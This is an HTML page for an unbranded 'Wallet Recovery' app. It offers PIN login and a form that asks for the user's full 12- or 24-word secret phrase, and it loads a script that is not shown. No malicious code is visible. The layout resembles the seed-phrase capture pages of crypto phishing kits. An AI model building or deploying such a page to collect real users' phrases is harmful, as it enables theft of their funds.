<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secret Phrase Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="./styles/secret-phrase.css">
</head>
<body>
    <div class="auth-container">
        <div class="app-header">
            <div class="app-logo">$</div>
            <h1 class="app-title">Wallet Recovery</h1>
            <p class="app-subtitle">Access your wallet using your secret phrase</p>
        </div>

        <div class="login-options">
            <button class="login-tab" onclick="showForm('pin')">PIN Login</button>
            <button class="login-tab active" onclick="showForm('phrase')">Secret Phrase</button>
        </div>

        <!-- PIN Login Form (Hidden by default) -->
        <div class="form-container" id="pinForm">
            <form id="pinLoginForm" action="dashboard.html">
                <div class="input-field">
                    <label class="input-label">Email or Username</label>
                    <input type="text" class="input-control" id="pinUsername" placeholder="your@email.com" >
                </div>

                <div class="input-field">
                    <label class="input-label">4-digit PIN</label>
                    <input type="password" class="input-control" id="pin" placeholder="••••" maxlength="4" pattern="\d*" inputmode="numeric" >
                </div>

                <button type="submit" class="btn btn-primary">Sign In</button>
            </form>

            <div class="divider">or</div>

            <button class="btn btn-secondary" onclick="window.location.href='dashboard.html'">
                Create New Wallet
            </button>
        </div>

        <!-- Secret Phrase Form (Visible by default) -->
        <div class="form-container active" id="phraseForm">
            <form id="phraseLoginForm">
                <div class="security-warning">
                    <div class="security-warning-icon">⚠️</div>
                    <div class="security-warning-text">
                        Never share your secret phrase with anyone. This phrase gives full access to your wallet and funds.
                    </div>
                </div>

                <div class="input-field">
                    <label class="input-label">Enter your 12-word secret phrase</label>
                    <textarea class="phrase-input" id="secretPhrase" placeholder="Enter your 12-word phrase separated by spaces" required></textarea>
                    <div class="word-counter" id="wordCounter">0/12 words</div>
                    <div class="phrase-hint">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10"></circle>
                            <line x1="12" y1="16" x2="12" y2="12"></line>
                            <line x1="12" y1="8" x2="12" y2="8"></line>
                        </svg>
                        Typically 12 (sometimes 24) words separated by spaces
                    </div>
                </div>

                <button type="submit" class="btn btn-primary" id="recoverBtn">Recover Wallet</button>
            </form>

            <div class="divider">or</div>

            <button class="btn btn-secondary" onclick="window.location.href='signup.html'">
                Create New Wallet
            </button>
        </div>

        <div class="signup-link">
            Remember your credentials? <a href="signin.html">Sign in normally</a>
        </div>
    </div>

    <script src="./script/secret-phrase.js"></script>

</body>
</html>
